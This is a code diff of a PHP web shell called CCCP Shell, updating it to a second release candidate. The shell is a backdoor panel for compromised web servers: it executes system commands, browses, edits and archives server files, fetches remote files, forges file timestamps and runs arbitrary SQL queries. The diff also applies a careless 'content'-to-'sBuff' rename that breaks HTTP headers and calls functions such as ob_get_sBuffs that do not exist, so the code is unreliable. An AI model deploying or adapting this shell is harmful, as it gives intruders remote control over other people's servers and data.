@@ -3,7 +3,7 @@
  *	CCCP Shell
  *	by DSR!
  *	https://github.com/xchwarze/CCCPShell
- *	v 1.0 RC 01072014
+ *  v 1.0 RC2 06072014
  */
 
 # System variables
@@ -65,13 +65,14 @@ if ((empty($_SERVER['HTTP_USER_AGENT'])) or (preg_match('/' . implode('|', $user
 }
 
 if (in_array($config['charset'], array('utf-8', 'big5', 'gbk', 'iso-8859-2', 'euc-kr', 'euc-jp'))) 
-	header("content-Type: text/html; charset=$config[charset]");
+	header("sBuff-Type: text/html; charset=$config[charset]");
 
 function mHide($name, $value){
 	return "<input id='$name' name='$name' type='hidden' value='$value' />";
 }
 
 function mInput($arg){
+	$arg['v'] = (isset($arg['v']) ? $arg['v'] : '');
 	$arg['e'] = (isset($arg['e']) ? $arg['e'] : '');
 	$arg['c'] = (isset($arg['c']) ? $arg['c'] : '');
 	$arg['tt'] = (isset($arg['tt']) ? $arg['tt'].'<br>' : '');
@@ -171,6 +172,10 @@ function showIcon($file) {
 }
 
 # General functions
+function hsc($s){
+	return htmlspecialchars($s, 2 | 1);
+}
+
 function execute($c, $i = false) {
     $v = '';
     $r = '';
@@ -191,13 +196,13 @@ function execute($c, $i = false) {
         } elseif (function_exists('system') && !in_array('system', $dis_func)) {
             @ob_start();
             @system($c);
-            $r = @ob_get_contents();
+            $r = @ob_get_sBuffs();
             @ob_end_clean();
 			$v = 'system';
         } elseif (function_exists('passthru') && !in_array('passthru', $dis_func)) {
             @ob_start();
             @passthru($c);
-            $r = @ob_get_contents();
+            $r = @ob_get_sBuffs();
             @ob_end_clean();
 			$v = 'passthru';
         } elseif (function_exists('popen') && !in_array('popen', $dis_func)) {
@@ -330,12 +335,12 @@ class PHPZip {
 		foreach ($filelist as $filename) {	
 			$filename = $basedir . $filename;
 			if (file_exists($filename)) {
-				if (is_dir($filename)) $content = $this->GetFileList($filename, $curdir);
+				if (is_dir($filename)) $sBuff = $this->GetFileList($filename, $curdir);
 				if (is_file($filename)) {
 					$fd = fopen($filename, 'r');
-					$content = @fread($fd, filesize($filename));
+					$sBuff = @fread($fd, filesize($filename));
 					fclose($fd);
-					$this->addFile($content, str_replace($curdir . DS, '', $filename));
+					$this->addFile($sBuff, str_replace($curdir . DS, '', $filename));
 				}
 			}
         }
@@ -353,9 +358,9 @@ class PHPZip {
                     if (is_dir($dir . $files)) $this->GetFileList($dir . $files . DS, $curdir);
                     else {
 						$fd = fopen($dir . $files, 'r');
-						$content = @fread($fd, filesize($dir . $files));
+						$sBuff = @fread($fd, filesize($dir . $files));
 						fclose($fd);
-						$this->addFile($content, str_replace($curdir . DS, '', $dir . $files));
+						$this->addFile($sBuff, str_replace($curdir . DS, '', $dir . $files));
                     }
                 }
             }
@@ -492,9 +497,9 @@ function download($url ,$save){
 	if(!preg_match("/[a-z]+:\/\/.+/",$url)) return false;
 	$filename = basename($url);
 
-	if($content = read_file($url)){
+	if($sBuff = read_file($url)){
 		if(is_file($save)) unlink($save);
-		if(write_file($save, $content))
+		if(write_file($save, $sBuff))
 			return true;
 	}
 	
@@ -560,7 +565,7 @@ function filesize64($file) {
 }
 
 
-$content = '';  	
+$sBuff = '';  	
 $p = fix_magic_quote($_POST);
 if (!empty($_GET)) $p += fix_magic_quote($_GET);
 
@@ -776,7 +781,7 @@ if (isset($p['me']) && $p['me'] === 'file') {
             }
     }
 
-    function GetSFileList($dir, $content, $re = 0) {
+    function GetSFileList($dir, $sBuff, $re = 0) {
             global $filedata, $j, $shelldir, $writabledb;
             ! $j && $j = 1;
             if ($dh = opendir($dir)) {
@@ -784,15 +789,15 @@ if (isset($p['me']) && $p['me'] === 'file') {
                     $ext = getext($file);
                     $f = str_replace('//', '/', $dir . '/' . $file);
                     if ($file !== '.' && $file !== '..' && is_dir($f)) {
-                        GetSFileList($f, $content, $re = 0);
+                        GetSFileList($f, $sBuff, $re = 0);
                     } elseif ($file !== '.' && $file !== '..' && is_file($f) && in_array($ext, explode(',', $writabledb))) {
                         $find = 0;
                         if ($re) {
-                            if (preg_match('@' . $content . '@', $file) || preg_match('@' . $content . '@', @file_get_contents($f))) {
+                            if (preg_match('@' . $sBuff . '@', $file) || preg_match('@' . $sBuff . '@', @file_get_sBuffs($f))) {
                                 $find = 1;
                             }
                         } else {
-                            if (strstr($file, $content) || strstr(@file_get_contents($f), $content)) {
+                            if (strstr($file, $sBuff) || strstr(@file_get_sBuffs($f), $sBuff)) {
                                 $find = 1;
                             }
                         }
@@ -845,10 +850,10 @@ if (isset($p['me']) && $p['me'] === 'file') {
 				if ($p['dl']) {
 					$zip = new PHPZip();
 					$zip->Zipper($p['fl'], $p['dl']);
-					header('content-type: application/octet-stream');
+					header('sBuff-type: application/octet-stream');
 					header('Accept-Ranges: bytes');
 					header('Accept-Length: ' . strlen($compress));
-					header('content-Disposition: attachment;filename=' . $_SERVER['HTTP_HOST'] . '_' . date('Ymd-His') . '.zip');
+					header('sBuff-Disposition: attachment;filename=' . $_SERVER['HTTP_HOST'] . '_' . date('Ymd-His') . '.zip');
 					echo $zip->file();
 					exit;
 				}
@@ -898,9 +903,9 @@ if (isset($p['me']) && $p['me'] === 'file') {
 					sAjax(tText('notexist', 'Object does not exist'));
 				else {
 					$fileinfo = pathinfo($p['fl']);
-					header('Content-Type: application/x-' . $fileinfo['extension']);
-					header('Content-Disposition: attachment; filename=' . $fileinfo['basename']);
-					header('Content-Length: ' . filesize($p['fl']));
+					header('sBuff-Type: application/x-' . $fileinfo['extension']);
+					header('sBuff-Disposition: attachment; filename=' . $fileinfo['basename']);
+					header('sBuff-Length: ' . filesize($p['fl']));
 					@readfile($p['fl']);
 					exit;
 				}
@@ -942,7 +947,7 @@ if (isset($p['me']) && $p['me'] === 'file') {
 				break;
 		}
 	} elseif (@$p['md'] === 'info') {			
-		$content .= '<b>' . tText('information', 'Information') . ': </b>
+		$sBuff .= '<b>' . tText('information', 'Information') . ': </b>
 					 <table border=0 cellspacing=1 cellpadding=2>
 					 <tr><td><b>' . tText('path', 'Path') . '</b></td><td>' . $p['t'] . '</td></tr>
 					 <tr><td><b>' . tText('size', 'Size') . '</b></td><td>' . sizecount(filesize($p['t'])) . '</td></tr>
@@ -955,15 +960,15 @@ if (isset($p['me']) && $p['me'] === 'file') {
 		if (!$isWIN) {
 			$ow = posix_getpwuid(fileowner($p['t']));
 			$gr = posix_getgrgid(filegroup($p['t']));
-			$content .= '<tr><td><b>' . tText('chmodchown', 'Chmod/Chown') . '</b></td><td>' .
+			$sBuff .= '<tr><td><b>' . tText('chmodchown', 'Chmod/Chown') . '</b></td><td>' .
 						($ow['name'] ? $ow['name'] : fileowner($p['t'])) . '/' . ($gr['name'] ? $gr['name'] : filegroup($p['t'])) .
 						'<tr><td><b>' . tText('perms', 'Perms') . '</b></td><td>' . vPermsColor($p['t']) . '</td></tr>';
 		}
-		$content .= '</table><br>';
+		$sBuff .= '</table><br>';
 				
 		$fp  = @fopen($p['t'], 'rb');
 		if ($fp) {
-			$content .= '<div data-path="' . $p['t'] . '"><p>
+			$sBuff .= '<div data-path="' . $p['t'] . '"><p>
 							[<a href="#" onclick="ajaxLoad(\'me=file&md=info&hl=n&t=\' + euc(dpath(this, false)));">' . tText('hl', 'Highlight') . '</a>]
 							[<a href="#" onclick="ajaxLoad(\'me=file&md=info&hl=p&t=\' + euc(dpath(this, false)));">' . tText('hlp', 'Highlight +') . '</a>]
 							[<a href="#" onclick="ajaxLoad(\'me=file&md=info&hd=n&t=\' + euc(dpath(this, false)));">' . tText('hd', 'Hexdump') . '</a>]
@@ -973,16 +978,16 @@ if (isset($p['me']) && $p['me'] === 'file') {
 			
 			if (isset($p['hd'])) {
 				if ($p['hd'] === 'n') {
-					$content .= '<b>Hex Dump</b><br>';
+					$sBuff .= '<b>Hex Dump</b><br>';
 					$str = fread($fp, filesize($p['t']));
 				} else {
-					$content .= '<b>Hex Dump Preview</b><br>';
+					$sBuff .= '<b>Hex Dump Preview</b><br>';
 					$str = fread($fp, $config['hd_lines'] * $config['hd_rows']);
 				}
 				
 				$show_offset  = '00000000<br>';
 				$show_hex     = '';
-				$show_content = '';
+				$show_sBuff = '';
 				$counter      = 0;
 				$str_len      = strlen($str);
 				for ($i = 0; $i < $str_len; $i++) {
@@ -993,58 +998,58 @@ if (isset($p['me']) && $p['me'] === 'file') {
 						case 9 :
 						case 10:
 						case 13:
-						case 32: $show_content .= ' '; 
+						case 32: $show_sBuff .= ' '; 
 							break;
-						default: $show_content .= $str[$i];
+						default: $show_sBuff .= $str[$i];
 					}
 					if ($counter === $config['hd_rows']) {
 						$counter = 0;
 						if ($i + 1 < $str_len) 
 							$show_offset .= sprintf('%08X', $i + 1) . '<br>';
 						$show_hex .= '<br>';
-						$show_content .= "\n";
+						$show_sBuff .= "\n";
 					}
 				}
-				$content .= '<center><table border=0 bgcolor=#666666 cellspacing=1 cellpadding=5><tr><td bgcolor=#666666><pre>' . $show_offset . '</pre></td><td bgcolor=000000><pre>' . $show_hex . '</pre></td><td bgcolor=000000><pre>' . htmlspecialchars($show_content) . '</pre></td></tr></table></center><br>';
+				$sBuff .= '<center><table border=0 bgcolor=#666666 cellspacing=1 cellpadding=5><tr><td bgcolor=#666666><pre>' . $show_offset . '</pre></td><td bgcolor=000000><pre>' . $show_hex . '</pre></td><td bgcolor=000000><pre>' . htmlspecialchars($show_sBuff) . '</pre></td></tr></table></center><br>';
 			} else if (isset($p['hl'])) {
 				if (function_exists('highlight_file')) {
 					if ($p['hl'] === 'n') {
-						$content .= '<b>Highlight content:</b><br>' .
+						$sBuff .= '<b>Highlight sBuff:</b><br>' .
 									'<div class=ml1 style="background-color: #e1e1e1; color:black;">' . highlight_file($p['t'], true) . '</div>'; 
 					} else {
 						$code = substr(highlight_file($p['t'], true), 36, -15);
 						$lines = explode('<br>', $code);
 						$padLength = strlen(count($lines));
-						$content .= '<b>Highlight + content:</b><br><br><div class=ml1 style="background-color: #e1e1e1; color:black;">';
+						$sBuff .= '<b>Highlight + sBuff:</b><br><br><div class=ml1 style="background-color: #e1e1e1; color:black;">';
 						
 						foreach($lines as $i => $line) {
 							$lineNumber = str_pad($i + 1,  $padLength, '0', STR_PAD_LEFT);
-							$content .= sprintf('<span style="color: #999999;font-weight: bold">%s | </span>%s<br>', $lineNumber, $line);
+							$sBuff .= sprintf('<span style="color: #999999;font-weight: bold">%s | </span>%s<br>', $lineNumber, $line);
 						}
 
-						$content .= '</div>';
+						$sBuff .= '</div>';
 					}
 				} else
 					sDialog(tText('hlerror', 'highlight_file() dont exist!'));
 			} else {
 				$str = @fread($fp, filesize($p['t']));
-				$content .= '<b>File content:</b><br>' .
+				$sBuff .= '<b>File sBuff:</b><br>' .
 							'<textarea class="bigarea" readonly>' . htmlspecialchars($str) . '</textarea><br><br>';
 			}
 		} else
-			$content .= sDialog(tText('accessdenied', 'Access denied'));
+			$sBuff .= sDialog(tText('accessdenied', 'Access denied'));
 		
 		@fclose($fp);
 	} elseif (@$p['md'] === 'edit') {
 		if (file_exists($p['t'])) {
 			$filemtime = explode('-', @date('Y-m-d-H-i-s', filemtime($p['t'])));
 		
-			$content .= '<h2>' . tText('edit', 'Edit') . '</h2>
+			$sBuff .= '<h2>' . tText('edit', 'Edit') . '</h2>
 					<div class="alt1 stdui"><form name="cldate">
 						' . mHide('me', 'file') . mHide('md', 'tools') . mHide('ac', 'mdatec') . '
 						<h3>' . tText('e1', 'Clone folder/file last modified time') . '</h3>
 						' . mInput(array('n'=>'a', 'v'=>$p['t'], 'tt'=>tText('e2', 'Alter folder/file'), 'nl'=>'', 'e'=>'style="width: 99%;" disabled')) . '
-						' . mInput(array('n'=>'b', 'v'=>'', 'tt'=>tText('e3', 'Reference folder/file (fullpath)'), 'nl'=>'', 'e'=>'style="width: 99%;"')) . '
+						' . mInput(array('n'=>'b', 'tt'=>tText('e3', 'Reference folder/file (fullpath)'), 'nl'=>'', 'e'=>'style="width: 99%;"')) . '
 						' . mSubmit(tText('go', 'Go!'), 'uiupdate(0)') . '
 					</form></div><br><br>
 					<div class="alt1 stdui"><form name="chdate">
@@ -1066,7 +1071,7 @@ if (isset($p['me']) && $p['me'] === 'file') {
 			$buf = @fread($fp, filesize($p['t']));
 			@fclose($fp);
 			if ($fp)
-				$content .= '<div class="alt1 stdui"><form data-path="' . $p['t'] . '">
+				$sBuff .= '<div class="alt1 stdui"><form data-path="' . $p['t'] . '">
 								' . mHide('me', 'file') . mHide('md', 'tools') . mHide('ac', 'edit') . mHide('a', $p['t']) . '
 								<h3>' . tText('e5', 'Edit file') . '</h3>
 								<p>
@@ -1091,11 +1096,11 @@ if (isset($p['me']) && $p['me'] === 'file') {
 			$currentdir = $p['dir'];
 		}
 
-        $content .= '<form><table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>';
+        $sBuff .= '<form><table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>';
 
         $free = @disk_free_space($currentdir);
         $all = @disk_total_space($currentdir);
-        if ($free) $content .= '<h2>' . tText('freespace', 'Free space') . ' ' . sizecount($free) . ' ' . tText('of', 'of') . ' ' . sizecount($all) . ' (' . round(100 / ($all / $free), 2) . '%)</h2>';
+        if ($free) $sBuff .= '<h2>' . tText('freespace', 'Free space') . ' ' . sizecount($free) . ' ' . tText('of', 'of') . ' ' . sizecount($all) . ' (' . round(100 / ($all / $free), 2) . '%)</h2>';
 		
 		$fp = '';
 		$lnks = '';
@@ -1107,7 +1112,7 @@ if (isset($p['me']) && $p['me'] === 'file') {
 		}
 		unset($fp, $tmp);
 
-		$content .= '<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
+		$sBuff .= '<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
 			  <tr>
 					<td nowrap>' . tText('acdir', 'Current directory') . ' [' . (@is_writable($currentdir) ? tText('writable', 'Writable') : tText('no', 'No') . ' ' . tText('writable', 'Writable')) . ($isWIN ? '' : ', ' . getChmod($currentdir)) . ']: </td>
 					<td width="100%"><span id="sgoui" class="hide"><div class="image dir" onclick="change(\'sgoui\', \'lnks\')"></div>&nbsp;
@@ -1118,7 +1123,7 @@ if (isset($p['me']) && $p['me'] === 'file') {
 			<tr class="alt1"><td colspan="7" style="padding:5px;">';
 
         if ($isWIN) {
-			$content .= tText('drive', 'Drive') . ': ';
+			$sBuff .= tText('drive', 'Drive') . ': ';
 			if (class_exists('COM')) {
 				$obj = new COM('scripting.filesystemobject');
 				if ($obj && is_object($obj)) {
@@ -1130,22 +1135,22 @@ if (isset($p['me']) && $p['me'] === 'file') {
 						5 => tText('ramdisk', 'RAM Disk'));
 						
 					foreach ($obj->Drives as $drive) {
-						$content .= ' [<a href="#" data-path="' . $drive->Path . '/\'" onclick=';
+						$sBuff .= ' [<a href="#" data-path="' . $drive->Path . '/\'" onclick=';
 						if ($drive->DriveType == 2) 
-							$content .= '"godisk(this);return false;" title="' . tText('size', 'Size') . ':' . sizecount($drive->TotalSize) . ' ' . tText('free', 'Free') . ':' . sizecount($drive->FreeSpace) . ' ' . tText('type', 'Type') . ':' . $DriveTypeDB[$drive->DriveType] . '">' . $DriveTypeDB[$drive->DriveType] . ' ' . $drive->Path . '</a>] ';
+							$sBuff .= '"godisk(this);return false;" title="' . tText('size', 'Size') . ':' . sizecount($drive->TotalSize) . ' ' . tText('free', 'Free') . ':' . sizecount($drive->FreeSpace) . ' ' . tText('type', 'Type') . ':' . $DriveTypeDB[$drive->DriveType] . '">' . $DriveTypeDB[$drive->DriveType] . ' ' . $drive->Path . '</a>] ';
 						else 
-							$content .= '"if (confirm(\'' . tText('derror', 'Make sure that disk is avarible, otherwise an error may occur.') . '\')) godisk(this);return false;" title="' . tText('type', 'Type') . ':' . $DriveTypeDB[$drive->DriveType] . '">' . $DriveTypeDB[$drive->DriveType] . ' ' . $drive->Path . '</a>]';
+							$sBuff .= '"if (confirm(\'' . tText('derror', 'Make sure that disk is avarible, otherwise an error may occur.') . '\')) godisk(this);return false;" title="' . tText('type', 'Type') . ':' . $DriveTypeDB[$drive->DriveType] . '">' . $DriveTypeDB[$drive->DriveType] . ' ' . $drive->Path . '</a>]';
 					}
 				}
             } else {
 				foreach (range('A', 'Z') as $letter){
-					if (@is_readable($letter . ':\\')) $content .= ' [<a href="#" data-path="' . $letter . ':\\" onclick="godisk(this);return false;" >' . $letter . ':</a>] ';
+					if (@is_readable($letter . ':\\')) $sBuff .= ' [<a href="#" data-path="' . $letter . ':\\" onclick="godisk(this);return false;" >' . $letter . ':</a>] ';
 				}
 			}
-			$content .= '<br>';
+			$sBuff .= '<br>';
         }
 
-        $content .= '
+        $sBuff .= '
 		<a href="#" data-path="' .$_SERVER['DOCUMENT_ROOT'] . '" onclick="godisk(this, false);return false;">' . tText('webroot', 'WebRoot') . '</a> | 
 		<!-- <a href="#" onclick="ajaxLoad(\'dir=' . $shelldir . '/&view_writable=dir\');">' . tText('vwdir', 'View writable directories') . '</a> | 
 		<a href="#" onclick="ajaxLoad(\'dir=' . $shelldir . '/&view_writable=file\');">' . tText('vwfils', 'View writable files') . '</a> | -->
@@ -1201,10 +1206,10 @@ if (isset($p['me']) && $p['me'] === 'file') {
 					natcasesort($filedata);
 				}
             } else
-				$content .= sDialog(tText('accessdenied', 'Access denied'));
+				$sBuff .= sDialog(tText('accessdenied', 'Access denied'));
         }
 		
-		$content .= '<table id="sort" class="explore sortable">
+		$sBuff .= '<table id="sort" class="explore sortable">
 			<thead><tr data-path="' . getUpPath($currentdir) . '" class="alt1">
 			<td class="alt1 sorttable_nosort"><a href="#" onclick="godir(this, false);return false;"><div class="image lnk"></div></a></td>
 			<td width="70%"><b>' . tText('name', 'Name') . '</b></td>
@@ -1218,7 +1223,7 @@ if (isset($p['me']) && $p['me'] === 'file') {
 			$d = 0;
 			$bg = 2;
 			foreach ($dirdata as $file) {
-                $content .= '<tr data-path="' . $file . DS . '" class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
+                $sBuff .= '<tr data-path="' . $file . DS . '" class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
 					<td><input type="checkbox" value="' . $file . DS . '" name="dl[]"></td>
 					<td><div class="image dir"></div><a href="#" onclick="godir(this, true);return false;">' . $file . '</a></td>
 					<td><a href="#" onclick="showUI(\'mdate\', this);return false;">' . date($config['datetime'], filemtime($currentdir . $file)) . '</a></td>
@@ -1239,14 +1244,14 @@ if (isset($p['me']) && $p['me'] === 'file') {
 			//uso esa variable para saber si corresponde o no el link al archivo
 			
             foreach ($filedata as $file) {
-                $content .= '<tr data-path="' . $file . '" class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
+                $sBuff .= '<tr data-path="' . $file . '" class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
 					<td width="2%"><input type="checkbox" value="' . $file . '" name="dl[]"></td><td>';
 
                 //mark shell name in yellow
-                if ($currentdir . $file === __file__) $content .= '<div class="image php"></div><font class="my">' . $file . '</font>';
-                else $content .= showIcon($file) . ' <a href="' . str_replace(SROOT, '', $file) . '" target="_blank">' . $file . '</a>';
+                if ($currentdir . $file === __file__) $sBuff .= '<div class="image php"></div><font class="my">' . $file . '</font>';
+                else $sBuff .= showIcon($file) . ' <a href="' . str_replace(SROOT, '', $file) . '" target="_blank">' . $file . '</a>';
 
-                $content .= '</td><td><a href="#" onclick="showUI(\'mdate\', this);return false;">' . date($config['datetime'], filemtime($currentdir . $file)) . '</a></td>
+                $sBuff .= '</td><td><a href="#" onclick="showUI(\'mdate\', this);return false;">' . date($config['datetime'], filemtime($currentdir . $file)) . '</a></td>
 							<td>' . sizecount(filesize64($currentdir . $file)) . '</td>
 							' . (!$isWIN ? '<td><a href="#" onclick="showUI(\'mpers\', this);return false;">' . vPermsColor($currentdir . $file) . '</a>&nbsp;' . getUser($currentdir . $file) . 
 							'</td>' : '') . '
@@ -1259,7 +1264,7 @@ if (isset($p['me']) && $p['me'] === 'file') {
 							</td></tr>';
             }
 
-            $content .= '</tbody><tfoot><tr class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
+            $sBuff .= '</tbody><tfoot><tr class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
 					<td width="2%">
 					<input name="chkall" value="" type="checkbox" onclick="CheckAll(this.form);" />
 					</td>
@@ -1282,7 +1287,7 @@ if (isset($p['me']) && $p['me'] === 'phpinfo') {
         phpinfo();
         exit;
     } else
-        $content = sDialog(tText('phpinfoerror', 'phpinfo() function has non-permissible'));
+        $sBuff = sDialog(tText('phpinfoerror', 'phpinfo() function has non-permissible'));
 }
 
 if (isset($p['me']) && $p['me'] === 'srm') {
@@ -1291,10 +1296,10 @@ if (isset($p['me']) && $p['me'] === 'srm') {
             @ob_clean();
 			exit('Bye ;(');
         } else
-            $content .= '<b>' . tText('fail', 'Fail!') . '</b><br>';
+            $sBuff .= '<b>' . tText('fail', 'Fail!') . '</b><br>';
     }
 	$r = mt_rand(1337, 9999);
-	$content .= '<form><b>' . tText('del', 'Del') . ': ' . __file__ . '<br><br>' . tText('reminfo', 'For confirmation enter this code') . ': ' . $r . '</b> 
+	$sBuff .= '<form><b>' . tText('del', 'Del') . ': ' . __file__ . '<br><br>' . tText('reminfo', 'For confirmation enter this code') . ': ' . $r . '</b> 
 			' . mHide('me', 'srm') . mHide('rc', $r) . '
 			<input type="text" name="uc">&nbsp;&nbsp;&nbsp;<input type="button" value="' . tText('go', 'Go!') . '" onclick="ajaxLoad(serialize(d.forms[0]));return false;" />
 			</form>';
@@ -1498,143 +1503,126 @@ if (isset($p['me']) && $p['me'] === 'sql') {
 	*/
 
 
-	$sql = array();
-	$sql_deleted = '';
-	$login_time = 604800; //3600 * 24 * 7;
-	$show_form = $show_dbs = true;
+	$login = 604800; //3600 * 24 * 7;
 
-	function hss($t){
-		return htmlspecialchars($t);
-	}
-		
-	function adds($s){
-		global $isWIN;
-		return ($isWIN) ? addslashes($s) : $s;
-	}
+	if (isset($p['sqlcode'])) {
+		$sBuff = '';
+		$con = sql_connect($p['sqltype'], $p['sqlhost'], $p['sqluser'], $p['sqlpass']);
+		foreach(explode(';', $p['sqlcode']) as $query) {
+			if (trim($query) !== '') {
+				$res = sql_query($p['sqltype'],$query,$con);
+				if ($res !== false) {
+					$sBuff .= '<hr /><p style="padding:0;margin:6px 10px;font-weight:bold;">' . hsc($query) . ';&nbsp;&nbsp;<span>[ ok ]</span></p>';
 
-	if(isset($p['dc'])){
-		$k = $p['dc'];
-		setcookie('c['.$k.']', '', time() - $login_time);
-		$sql_deleted = $k;
-	}
-
-	if(isset($_COOKIE['c']) && !isset($p['sqlhost'])){
-		foreach($_COOKIE['c'] as $c => $d){
-			if($c==$sql_deleted) continue;
-			$dbcon = (function_exists('json_encode') && function_exists('json_decode')) ? json_decode($d) : unserialize($d);
-			foreach($dbcon as $k => $v) $sql[$k] = $v;
-			$sqlport = ($sql['port'] !== '') ? ':'.$sql['port'] : '';
-			$content .= sDialog('['.$sql['type'].'] '.$sql['user'].'@'.$sql['host'].$sqlport.'
-						<span style="float:right;"><a href="#" onclick="ajaxLoad(\'me=sql&sqlhost='.$sql['host'].'&sqlport='.$sql['port'].'&sqluser='.$sql['user'].'&sqlpass='.$sql['pass'].'&sqltype='.$sql['type'].'\');">connect</a> | <a href="#" onclick="ajaxLoad(\'me=sql&dc='.$c.'\')">disconnect</a></span>');
+					if (!is_bool($res)) {
+						$sBuff .= '<table id="sort" class="explore sortable" style="width:100%;"><tr>';
+						for ($i = 0; $i<sql_num_fields($p['sqltype'], $res, $con); $i++)
+							$sBuff .= '<th>' . @hsc(sql_field_name($p['sqltype'], $res, $i)) . '</th>';
+						$sBuff .= '</tr>';
+						while($rows=sql_fetch_data($p['sqltype'], $res)) {
+							$sBuff .= '<tr>';
+							foreach($rows as $r){
+								//if ($r === '') $r = ' ';
+								$sBuff .= '<td>' . @hsc($r) . '</td>';
+							}
+							$sBuff .= '</tr>';
+						}
+						$sBuff .= '</table>';
+					}
+				} else
+					$sBuff .= '<p style="padding:0;margin:6px 10px;font-weight:bold;">' . hsc($query) . ';&nbsp;&nbsp;&nbsp;<span>[ error ]</span></p>';
+			}
 		}
-	} else {
-		$sql['host'] = isset($p['sqlhost']) ? $p['sqlhost'] : '';
-		$sql['port'] = isset($p['sqlport']) ? $p['sqlport'] : '';
-		$sql['user'] = isset($p['sqluser']) ? $p['sqluser'] : '';
-		$sql['pass'] = isset($p['sqlpass']) ? $p['sqlpass'] : '';
-		$sql['type'] = isset($p['sqltype']) ? $p['sqltype'] : '';
-	}
-
-	if(isset($p['sqlhost'])){
-		$con = sql_connect($sql['type'], $sql['host'], $sql['user'], $sql['pass']);
-		$sqlcode = isset($p['sqlcode']) ? $p['sqlcode'] : '';
-
-		if($con !== false){
+		
+		sAjax($sBuff);
+	} elseif (isset($p['sqlhost'])) {
+		$con = sql_connect($p['sqltype'], $p['sqlhost'], $p['sqluser'], $p['sqlpass']);
+		if ($con !== false){
 			if(isset($p['sqlinit'])){
 				$sql_cookie = (function_exists('json_encode') && function_exists('json_decode')) ? json_encode($sql):serialize($sql);
-				$c_num = substr(md5(time().rand(0,100)),0,3);
+				$c_num = substr(md5(time() . rand(0, 100)), 0, 3);
 				while(isset($_COOKIE['c']) && is_array($_COOKIE['c']) && array_key_exists($c_num, $_COOKIE['c'])){
-					$c_num = substr(md5(time().rand(0,100)),0,3);
+					$c_num = substr(md5(time() . rand(0, 100)), 0, 3);
 				}
-				setcookie('c['.$c_num.']', $sql_cookie ,time() + $login_time);
+				setcookie('c[' . $c_num . ']', $sql_cookie, time() + $login);
 			}
-			$show_form = false;
-			$content .= '<form>' .
-				mHide('me', 'sql') . mHide('sqltype', $sql['type']) . 
-				mHide('sqlhost', $sql['host']) . mHide('sqlport', $sql['port']) . 
-				mHide('sqluser', $sql['user']) . mHide('sqlpass', $sql['pass']) . '
-				<textarea id="sqlcode" name="sqlcode" class="bigarea" style="height:100px;">'.hss($sqlcode).'</textarea>
-				<p>' . mSubmit(tText('go', 'Go!'), 'ajaxLoad(serialize(d.forms[0]))') . '
-				&nbsp;&nbsp;Separate multiple commands with a semicolon  <span>[ ; ]</span></p>
-				</form>';
+			
+			$sBuff .= '<form>' .
+				mHide('me', 'sql') . mHide('sqltype', $p['sqltype']) . 
+				mHide('sqlhost', $p['sqlhost']) . mHide('sqlport', $p['sqlport']) . 
+				mHide('sqluser', $p['sqluser']) . mHide('sqlpass', $p['sqlpass']) . '
+				</form><textarea id="sqlcode" name="sqlcode" class="bigarea" style="height: 100px;"></textarea>
+				<p>' . mSubmit(tText('go', 'Go!'), 'dbexec(d.getElementById(\'sqlcode\').value)') . '&nbsp;&nbsp;
+				' . tText('sq4', 'Separate multiple commands with a semicolon') . ' <span>[ ; ]</span></p>
+				<table class="border" style="padding:0;"><tbody>
+				<tr><td id="dbNav" class="colFit borderright" style="vertical-align:top;">';
+				
+			if (($p['sqltype']!=='pdo') && ($p['sqltype']!=='odbc')) {
+				if ($p['sqltype']==='mssql') $showdb = 'SELECT name FROM master..sysdatabases';
+				elseif ($p['sqltype']==='pgsql') $showdb = 'SELECT schema_name FROM information_schema.schemata';
+				elseif ($p['sqltype']==='oracle') $showdb = 'SELECT USERNAME FROM SYS.ALL_USERS ORDER BY USERNAME';
+				elseif ($p['sqltype']==='sqlite' || $p['sqltype']==='sqlite3') $showdb = "SELECT '".$p['sqlhost']."'";
+				else $showdb = 'SHOW DATABASES'; //mysql
 
-			if($sqlcode !== ''){
-				$querys = explode(';',$sqlcode);
-				foreach($querys as $query){
-					if(trim($query) !== ''){
-						$result = sql_query($sql['type'],$query,$con);
-						if($result !== false){
-							$content .= '<hr /><p style="padding:0;margin:6px 10px;font-weight:bold;">'.hss($query).';&nbsp;&nbsp;&nbsp;<span>[ ok ]</span></p>';
+				$res = sql_query($p['sqltype'], $showdb, $con);
+				if ($res !== false) {
+					$bg = 0;
+					while($rowarr = sql_fetch_data($p['sqltype'], $res)){
+						foreach($rowarr as $rows){
+							$sBuff .= '<p class="notif ' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '" onclick=\'toggle("db_'.$rows.'")\'>'.$rows.'</p><div class="uiinfo" id="db_'.$rows.'"><table>';
 
-							if(!is_bool($result)){
-								$content .= '<table id="sort" class="explore sortable" style="width:100%;"><tr>';
-								for ($i = 0; $i<sql_num_fields($sql['type'], $result, $con); $i++)
-									$content .= '<th>'.@hss(sql_field_name($sql['type'], $result, $i)).'</th>';
-								$content .= '</tr>';
-								while($rows=sql_fetch_data($sql['type'], $result)) {
-									$content .= '<tr>';
-									foreach($rows as $r){
-										//if ($r === '') $r = ' ';
-										$content .= '<td>'.@hss($r).'</td>';
-									}
-									$content .= '</tr>';
-								}
-								$content .= '</table>';
-							}
-						} else
-							$content .= '<p style="padding:0;margin:6px 10px;font-weight:bold;">'.hss($query).';&nbsp;&nbsp;&nbsp;<span>[ error ]</span></p>';
-					}
-				}
-			} else {
-				if(($sql['type']!=='pdo') && ($sql['type']!=='odbc')){
-					if($sql['type']==='mssql') $showdb = 'SELECT name FROM master..sysdatabases';
-					elseif($sql['type']==='pgsql') $showdb = 'SELECT schema_name FROM information_schema.schemata';
-					elseif($sql['type']==='oracle') $showdb = 'SELECT USERNAME FROM SYS.ALL_USERS ORDER BY USERNAME';
-					elseif($sql['type']==='sqlite' || $sql['type']==='sqlite3') $showdb = "SELECT '".$sql['host']."'";
-					else $showdb = 'SHOW DATABASES'; //mysql
+							if($p['sqltype']==='mssql') $showtbl = 'SELECT name FROM '.$rows."..sysobjects WHERE xtype = 'U'";
